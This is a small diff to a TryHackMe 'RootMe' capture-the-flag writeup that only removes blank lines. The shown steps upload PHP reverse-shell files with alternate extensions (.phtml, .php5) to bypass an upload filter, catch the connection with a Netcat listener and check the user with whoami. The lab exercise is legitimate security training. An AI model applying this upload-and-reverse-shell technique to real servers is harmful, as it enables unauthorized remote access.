@@ -143,10 +143,8 @@ Listening on [0.0.0.0] (family 0, port 9999)
 `cp php-reverse-shell.php php-reverse-shell.phps`
 
 16. `firefox http://{TARGET IP}/uploads` to see the files that we managed to successfully upload onto the target system
-
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20RootMe/Uploads%20Directory.png)
 17. Although we managed to successfully upload four out of the five different PHP versions, only two of them (**.phtml** and **.php5**) are able to be executed and connect back to our Netcat listener without any problem
-
 18. `whoami` to see who we managed to connect to the server as
 ```bash
 Listening on [0.0.0.0] (family 0, port 9999)
